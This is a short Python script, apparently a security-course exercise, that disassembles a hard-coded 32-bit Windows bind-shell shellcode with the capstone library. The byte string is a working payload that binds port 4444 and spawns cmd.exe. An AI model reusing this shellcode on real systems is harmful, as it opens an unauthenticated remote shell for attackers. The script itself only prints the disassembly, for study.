#!/usr/bin/env python

# Author: SPSE-3232
# Purpose:
# - Create simple shellcode for a windows bind shell and then use pydasm to disassemble it
#
# NB: pydasm is deprecated, using capstone instead

from capstone import *

shellcode = b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x78\x10\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x83\xec\x20\x8d\x34\x24\x66\xb9\x94\x02\x8b\x53\x1c\x01\xfa\x8b\x04\x0a\x01\xf8\x89\x06\x66\xb9\x68\x04\x8b\x04\x0a\x01\xf8\x89\x46\x04\x66\xb9\xf0\x0c\x8b\x04\x0a\x01\xf8\x31\xc9\x68\x6c\x6c\x41\x41\x66\x89\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x8d\x1c\x24\x53\xff\xd0\x89\xc7\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x8b\x53\x1c\x01\xfa\x31\xc9\x66\xb9\xc8\x01\x8b\x04\x0a\x01\xf8\x89\x46\x08\x66\xb9\x88\x01\x8b\x04\x0a\x01\xf8\x89\x46\x0c\x8b\x42\x04\x01\xf8\x89\x46\x10\x8b\x42\x30\x01\xf8\x89\x46\x14\x8b\x02\x01\xf8\x89\x46\x18\x8b\x42\x50\x01\xf8\x89\x46\x1c\x66\xb9\x90\x01\x29\xcc\x8d\x1c\x24\x66\xb9\x02\x02\x53\x51\xff\x56\x08\x31\xc9\x51\x51\x51\xb1\x06\x51\x83\xe9\x05\x51\x41\x51\xff\x56\x0c\x89\xc7\x99\xb2\x02\x52\x4a\x52\x8d\x0c\x24\xb2\x04\x51\x52\x66\xba\xff\xff\x52\x57\xff\x56\x1c\x99\x52\x52\x52\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\x8d\x0c\x24\xb2\x10\x52\x51\x57\xff\x56\x10\x99\x42\x52\x57\xff\x56\x14\x99\x52\x52\x52\x52\xb2\x10\x8d\x0c\x24\x52\x8d\x1c\x24\x53\x51\x57\xff\x56\x18\x89\xc7\x99\x83\xec\x10\x8d\x1c\x24\x57\x57\x57\x52\x52\xb2\xff\x42\x52\x99\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\xb2\x44\x52\x8d\x0c\x24\x99\x68\x65\x78\x65\x41\x88\x54\x24\x03\x68\x63\x6d\x64\x2e\x8d\x04\x24\x53\x51\x52\x52\x52\x42\x52\x99\x52\x52\x50\x52\xff\x16\x50\xff\x56\x04"

md = Cs(CS_ARCH_X86, CS_MODE_32)

for i in md.disasm(shellcode, 0):
    print("0x{a}:\t{m}\t{o}".format(a=i.address, m=i.mnemonic, o=i.op_str))